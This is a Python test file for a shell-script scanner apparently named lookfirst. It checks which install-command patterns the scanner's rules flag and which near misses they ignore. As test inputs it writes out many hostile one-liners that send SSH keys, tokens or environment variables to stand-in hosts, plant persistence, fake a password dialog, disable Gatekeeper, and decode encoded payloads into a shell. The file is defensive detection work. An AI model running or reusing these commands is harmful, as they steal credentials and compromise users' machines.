"""Each shell rule: what it catches, and the near misses it must leave alone."""

from __future__ import annotations

import httpx
import pytest

from lookfirst.static.context import RuleContext
from lookfirst.static.fetch import RemoteReader
from lookfirst.static.model import Collector, Origin, Snippet
from lookfirst.static.shell_parse import parse_shell
from lookfirst.static.shell_rules import (
    ShellAnalyzer,
    as_download,
    credential_kind,
    peel,
    reads_stdin,
)


def rules_for(
    script: str, *, repo: str | None = None, reader: RemoteReader | None = None
) -> set[str]:
    ctx = RuleContext()
    ctx.set_repo(repo)
    out = Collector()
    ShellAnalyzer(ctx, out, reader).analyze(
        Snippet(script, Origin("install.sh", 1, "if you run install.sh"))
    )
    return {f.id.split(".", 1)[1] for f in out.findings()}


CATCHES = [
    ("cat ~/.ssh/id_rsa | curl -d @- https://x.example/c", "credential_theft"),
    ("tar czf /tmp/k.tgz ~/.aws && curl -T /tmp/k.tgz https://x.example", "credential_theft"),
    (
        "curl -F 'f=@/Users/me/Library/Application Support/Google/Chrome/Default/Login Data' https://x",
        "credential_theft",
    ),
    ("security find-generic-password -s x -w | nc x.example 9000", "credential_theft"),
    ("env | curl -d @- https://x.example", "credential_theft"),
    ('curl -d "t=$GITHUB_TOKEN" https://evil.example', "credential_theft"),
    ("cp ~/.config/gh/hosts.yml ./backup", "credential_read"),
    (
        """osascript -e 'display dialog "Password:" default answer "" with hidden answer'""",
        "fake_password_prompt",
    ),
    ("cp helper.plist ~/Library/LaunchAgents/", "persistence"),
    ("launchctl bootstrap gui/501 ~/Library/LaunchAgents/x.plist", "persistence"),
    ("echo '* * * * * x' | crontab -", "persistence"),
    ("echo 'curl -s https://x | sh' >> ~/.bashrc", "persistence"),
    ("cat key.pub >> ~/.ssh/authorized_keys", "persistence"),
    ("echo ZWNobyBoaQ== | base64 --decode | bash", "decode_and_run"),
    ('bash -c "$(echo ZWNobyBoaQ== | base64 -d)"', "decode_and_run"),
    ("printf '\\x65\\x63\\x68\\x6f' | sh", "decode_and_run"),
    ("xattr -c ./App.app", "quarantine_removed"),
    ("sudo spctl --global-disable", "gatekeeper_off"),
    ("curl -s https://x.example/i.sh | sudo -E bash", "sudo_piped_download"),
    ('sudo bash -c "$(curl -fsSL https://x.example/i.sh)"', "sudo_piped_download"),
    ("curl -s https://x.example/i.sh | bash", "remote_script_unknown_site"),
    ("wget -qO- https://x.example/i.sh | sh", "remote_script_unknown_site"),
    ("bash <(curl -s https://x.example/i.sh)", "remote_script_unknown_site"),
    ("source <(curl -s https://x.example/i.sh)", "remote_script_unknown_site"),
    ("curl -o i.sh https://x.example/i.sh && bash i.sh", "remote_script_unknown_site"),
    ("npm i -g left-pad", "global_install"),
    ("sudo pip3 install widget", "global_install"),
    ("pip install --break-system-packages widget", "global_install"),
    ("curl -o x http://x.example/x", "plain_http"),
    ("git clone http://x.example/repo.git", "plain_http"),
    ("sudo systemctl enable widget", "background_service"),
    ("echo 'export PATH=$HOME/.w/bin:$PATH' >> ~/.zprofile", "shell_rc_change"),
]


@pytest.mark.parametrize(("script", "rule"), CATCHES)
def test_rule_catches(script: str, rule: str) -> None:
    assert rule in rules_for(script)


LEAVES_ALONE = [
    ("cat ~/.ssh/id_rsa.pub", "credential_read"),
    ("ssh-keygen -t ed25519 -f ~/.ssh/id_ed25519", "credential_read"),
    ("mkdir -p ~/.ssh && chmod 700 ~/.ssh", "credential_read"),
    ("cat ~/.aws/config", "credential_read"),
    ('echo "//registry.npmjs.org/:_authToken=${NPM_TOKEN}" > ~/.npmrc', "credential_read"),
    (
        'curl -H "Authorization: token $GITHUB_TOKEN" https://api.github.com/user',
        "credential_theft",
    ),
    ("echo 'eval \"$(/opt/homebrew/bin/brew shellenv)\"' >> ~/.zprofile", "persistence"),
    ("crontab -l", "persistence"),
    ("curl -fsSL https://x.example/data.json | jq .", "remote_script_unknown_site"),
    (
        "curl -fsSL https://x.example/key.gpg | sudo gpg --dearmor -o /usr/share/keyrings/x.gpg",
        "sudo_piped_download",
    ),
    (
        "curl -fsSL https://x.example/k | sudo sh -c 'gpg --dearmor > /etc/apt/x.gpg'",
        "sudo_piped_download",
    ),
    ("bash ./install.sh $(curl -s https://x.example/version)", "remote_script_unknown_site"),
    ("echo $(base64 -d <<< aGk=)", "decode_and_run"),
    ('\\. "$NVM_DIR/nvm.sh"', "decode_and_run"),
    ("npm install widget", "global_install"),
    ("pip install --user widget", "global_install"),
    ("curl -o x http://localhost:8080/x", "plain_http"),
    ("xattr -l ./App.app", "quarantine_removed"),
    ("osascript -e 'display notification \"Done\"'", "fake_password_prompt"),
]


@pytest.mark.parametrize(("script", "rule"), LEAVES_ALONE)
def test_rule_leaves_near_misses_alone(script: str, rule: str) -> None:
    assert rule not in rules_for(script)


def test_own_repo_scripts_are_info_when_pinned_and_medium_when_not() -> None:
    sha = "a" * 40
    assert "own_remote_script" in rules_for(
        f"curl -s https://raw.githubusercontent.com/acme/widget/{sha}/i.sh | sh", repo="acme/widget"
    )
    assert "unpinned_remote_script" in rules_for(
        "curl -s https://raw.githubusercontent.com/acme/widget/main/i.sh | sh", repo="acme/widget"
    )
    assert "remote_script_unknown_site" in rules_for(
        "curl -s https://raw.githubusercontent.com/other/x/main/i.sh | sh", repo="acme/widget"
    )


def test_known_installers_are_info() -> None:
    assert rules_for("curl -sSf https://sh.rustup.rs | sh") == {"known_installer"}


def test_a_lookalike_installer_address_is_not_known() -> None:
    assert "known_installer" not in rules_for("curl -sSf https://sh.rustup.rs.evil.example | sh")
    assert "known_installer" not in rules_for(
        "curl -sSf http://sh.rustup.rs | sh"
    )  # http isn't official


def test_nested_shell_strings_are_read_too() -> None:
    assert "persistence" in rules_for("""sudo sh -c 'echo "* * * * * x" | crontab -'""")
    assert "persistence" in rules_for("bash <<EOF\ncp x.plist ~/Library/LaunchAgents/\nEOF")


def test_downloaded_scripts_are_followed_and_read(mock_http) -> None:
    scripts = {
        "https://x.example/one.sh": "curl -s https://y.example/two.sh | sh",
        "https://y.example/two.sh": "cat ~/.ssh/id_rsa | curl -d @- https://z.example",
    }
    mock_http(lambda r: httpx.Response(200, text=scripts[str(r.url)]))
    reader = RemoteReader()
    found = rules_for("curl -s https://x.example/one.sh | bash", reader=reader)
    assert "credential_theft" in found


def test_download_loops_stop(mock_http) -> None:
    scripts = {
        "https://x.example/a.sh": "curl -s https://x.example/b.sh | sh",
        "https://x.example/b.sh": "curl -s https://x.example/a.sh | sh",
    }
    sent = mock_http(lambda r: httpx.Response(200, text=scripts[str(r.url)]))
    rules_for("curl -s https://x.example/a.sh | sh", reader=RemoteReader())
    assert len(sent) == 2


def test_depth_is_limited(mock_http) -> None:
    mock_http(lambda r: httpx.Response(200, text=f"curl -s {r.url}x | sh"))
    out = Collector()
    ShellAnalyzer(RuleContext(), out, RemoteReader()).analyze(
        Snippet(
            "curl -s https://x.example/x | sh",
            Origin("command", 1, "when you run this command"),
            root_command=True,
        )
    )
    unreadable = [f for f in out.findings() if f.id == "install_path.remote_unreadable"]
    assert unreadable and "3 levels" in unreadable[0].evidence[0].data["reason"]


@pytest.mark.parametrize(
    ("argv", "rest"),
    [
        (["sudo", "-E", "bash"], ["bash"]),
        (["sudo", "-u", "root", "sh", "-s"], ["sh", "-s"]),
        (["env", "A=1", "B=2", "sh"], ["sh"]),
        (["nohup", "nice", "-n", "5", "bash"], ["bash"]),
        (["timeout", "30", "bash"], ["bash"]),
    ],
)
def test_peel(argv: list[str], rest: list[str]) -> None:
    assert peel(argv)[1] == rest


@pytest.mark.parametrize(
    ("rest", "expected"),
    [
        (["sh"], True),
        (["bash", "-s", "--", "--yes"], True),
        (["bash", "-x"], True),
        (["sh", "-"], True),
        (["bash", "-c", "echo"], False),
        (["bash", "-ec", "echo"], False),
        (["bash", "script.sh"], False),
        (["python3"], True),
        (["python3", "-"], True),
        (["python3", "-c", "x"], False),
        (["node", "app.js"], False),
        (["jq", "."], False),
    ],
)
def test_reads_stdin(rest: list[str], expected: bool) -> None:
    assert reads_stdin(rest) is expected


def test_curl_and_wget_options() -> None:
    (curl,) = parse_shell("curl -fsSLo /tmp/x https://a.example/x").commands
    d = as_download(curl)
    assert d and d.out_files == ["/tmp/x"] and not d.to_stdout and d.urls == ["https://a.example/x"]
    (wget,) = parse_shell("wget -qO- https://a.example/i.sh").commands
    d = as_download(wget)
    assert d and d.to_stdout
    (bare,) = parse_shell("curl get.example.com/i.sh").commands
    assert as_download(bare).urls == ["http://get.example.com/i.sh"]  # type: ignore[union-attr]


@pytest.mark.parametrize(
    ("word", "kind"),
    [
        ("~/.ssh/id_ed25519", "SSH keys"),
        ("/home/u/.ssh", "SSH keys"),
        ("~/.ssh/known_hosts", None),
        ("~/.aws/credentials", "AWS keys"),
        ("~/.aws/config", None),
        ("@/root/.netrc", "saved passwords"),
        ("~/Library/Keychains/login.keychain-db", "the macOS Keychain"),
        ("./.env", "a .env file, which often holds API keys"),
        (".env.example", None),
        ("~/.config/solana/id.json", "crypto wallets"),
        ("README.md", None),
    ],
)
def test_credential_kind(word: str, kind: str | None) -> None:
    assert credential_kind(word) == kind


# --- decoded payloads (M6) -------------------------------------------------------

_THEFT = "cat ~/.ssh/id_rsa | curl -d @- https://x.example/c\n"


def _b64(text: str | bytes) -> str:
    import base64

    return base64.b64encode(text.encode() if isinstance(text, str) else text).decode()


def _gzip_b64(text: str) -> str:
    import gzip

    return _b64(gzip.compress(text.encode()))


@pytest.mark.parametrize(
    "script",
    [
        f"echo {_b64(_THEFT)} | base64 -d | sh",
        f"echo -n '{_b64(_THEFT)}' | base64 --decode | bash",
        f"printf '%s' {_b64(_THEFT)} | base64 -D | zsh",
        f'base64 -d <<< "{_b64(_THEFT)}" | bash',
        f'bash -c "$(echo {_b64(_THEFT)} | base64 -d)"',
        f"echo {_b64(_THEFT).replace('+', '-').replace('/', '_')} | base64 -d | sh",
        f"echo {_THEFT.encode().hex()} | xxd -r -p | sh",
        f"echo {_gzip_b64(_THEFT)} | base64 -d | gunzip | sh",
    ],
)
def test_a_payload_written_into_the_command_is_decoded_and_read(script: str) -> None:
    """The "paste this into Terminal" trick: decoding it is only reading, and every rule
    then looks at what's inside."""
    assert {"decode_and_run", "credential_theft"} <= rules_for(script)


@pytest.mark.parametrize(
    "script",
    [
        f"echo {_b64(bytes(range(256)))} | base64 -d | sh",  # a program, not a script
        "echo not-base64!! | base64 -d | sh",
        'echo "$PAYLOAD" | base64 -d | sh',  # only known when it runs
        f"echo {_b64('echo hello')} | base64 -d | sh",
    ],
)
def test_payloads_that_cant_be_read_or_are_harmless_only_say_decode_and_run(script: str) -> None:
    assert rules_for(script) == {"decode_and_run"}


def test_a_decoded_finding_points_into_the_decoded_text() -> None:
    ctx = RuleContext()
    out = Collector()
    script = f"echo {_b64('echo hi' + chr(10) + _THEFT)} | base64 -d | sh"
    ShellAnalyzer(ctx, out, None).analyze(
        Snippet(script, Origin("command", 1, "when you run the command"), root_command=True)
    )
    (theft,) = [f for f in out.findings() if f.id == "install_path.credential_theft"]
    assert {(e.ref, e.line) for e in theft.evidence} == {("the command, decoded", 2)}


def test_program_names_are_matched_in_any_case() -> None:
    """macOS finds programs whatever their case: `CURL ... | BASH` is curl into bash."""
    assert "remote_script_unknown_site" in rules_for("CURL -fsSL https://x.example/i.sh | BASH")
    assert {"decode_and_run", "credential_theft"} <= rules_for(
        f"ECHO {_b64(_THEFT)} | BASE64 -D | SH"
    )
